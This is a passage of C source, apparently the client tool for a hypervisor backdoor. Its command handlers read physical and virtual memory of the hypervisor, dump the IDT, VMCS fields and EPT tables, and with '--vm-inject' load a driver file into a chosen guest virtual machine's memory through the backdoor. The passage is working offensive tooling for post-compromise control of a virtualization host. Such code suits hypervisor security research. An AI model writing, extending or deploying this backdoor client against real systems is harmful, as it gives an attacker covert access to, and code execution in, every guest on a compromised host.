                if (backdoor_phys_read(addr, buff, size) == 0)
                {
                    hexdump(buff, size, addr);
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--phys-translate") && argc >= 5)
        {
            // translate guest physical address to host physical address
            uint64_t phys_addr = 0;
            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid PML4 address\n");
                return -1;
            }

            uint64_t addr = strtoull(argv[4], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            if (backdoor_phys_translate(addr, &phys_addr, pml4_addr) == 0)
            {
                printf("\n0x%.16llx -> 0x%.16llx\n", addr, phys_addr);
            }
        }
        else if (!strcmp(command, "--idt"))
        {
            HVBD_INFO info;

            // get hypervisor information
            if (backdoor_info(&info) != 0)
            {
                return -1;
            }

            uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
            if (buff)
            {
                // read IDT contents
                if (backdoor_virt_read(info.idt_base, buff, PAGE_SIZE) == 0)
                {
                    IDT_ENTRY *idt = (IDT_ENTRY *)buff;

                    printf("[+] Hypervisor IDT dump:\n\n");

                    for (int i = 0; i < PAGE_SIZE / sizeof(IDT_ENTRY); i += 1)
                    {
                        uint64_t addr = ((uint64_t)idt->offset32 << 32) |
                                                  (idt->high_offset << 16) | idt->low_offset;

                        printf("%.4x: 0x%llx\n", i, addr);

                        idt += 1;
                    }
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--vmcs"))
        {
            if (argc >= 4)
            {
                uint64_t val = strtoull(argv[3], NULL, 16);
                uint64_t data = 0;

                if (errno == EINVAL)
                {
                    printf("ERROR: Invalid value\n");
                    return -1;
                }

                if (backdoor_vmread(val, &data) == 0)
                {
                    printf("[+] VMCS [0x%llx]: 0x%llx\n", val, data);
                }
            }
            else
            {
                int i = 0;

                printf("[+] VMCS dump:\n\n");

                // enumerate VMCS fields
                while (m_vmcs_fields[i].name != NULL)
                {
                    uint64_t data = 0;

                    // read single field
                    if (backdoor_vmread(m_vmcs_fields[i].val, &data) != 0)
                    {
                        return -1;
                    }

                    printf("%30s: 0x%llx\n", m_vmcs_fields[i].name, data);

                    i += 1;
                }
            }
        }
        else if (!strcmp(command, "--ept-list"))
        {
            EPT_INFO ept_list[EPT_MAX_COUNT];

            if (backdoor_ept_list(ept_list) == 0)
            {
                printf("\n");

                for (int i = 0; i < EPT_MAX_COUNT; i += 1)
                {
                    if (ept_list[i].Addr != EPT_NONE)
                    {
                        printf(
                            "  #%.2d: VPID = 0x%.4x, EPT = 0x%.16llx\n", 
                            i, ept_list[i].Vpid, ept_list[i].Addr
                        );
                    }        
                }
            }
        }
        else if (!strcmp(command, "--ept-dump") && argc >= 4)
        {        
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid EPT address\n");
                return -1;
            }

            printf("[+] EPT dump with PML4 at 0x%llx:\n\n", addr);

            backdoor_ept_dump(addr);
        }
        else if (!strcmp(command, "--vm-inject") && argc >= 5)
        {        
            struct stat st;
            char *driver_path = argv[4];

            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);
            uint64_t phys_addr = 0;

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid EPT address\n");
                return -1;
            }
            
            if (stat(driver_path, &st) != 0)
            {
                printf("ERROR: Can't access %s\n", driver_path);
                return -1;
            }

            printf("[+] Loading %d bytes from %s\n", st.st_size, driver_path);

            unsigned char *driver = (unsigned char *)malloc(st.st_size);
            if (driver == NULL)
            {
                return -1;
            }            

            FILE *fd = fopen(driver_path, "rb");
            if (fd)
            {
                if (fread(driver, 1, st.st_size, fd) == st.st_size)
                {
                    backdoor_vm_inject(pml4_addr, driver, st.st_size);
                }
                else
                {
                    printf("ERROR: Can't read %s\n", driver_path);
                }

                fclose(fd);
            }            

            free(driver);
        }
        else
        {
            printf("ERROR: Invalid command\n");
        }
    }       

    return 0;
}
//--------------------------------------------------------------------------------------
// EoF
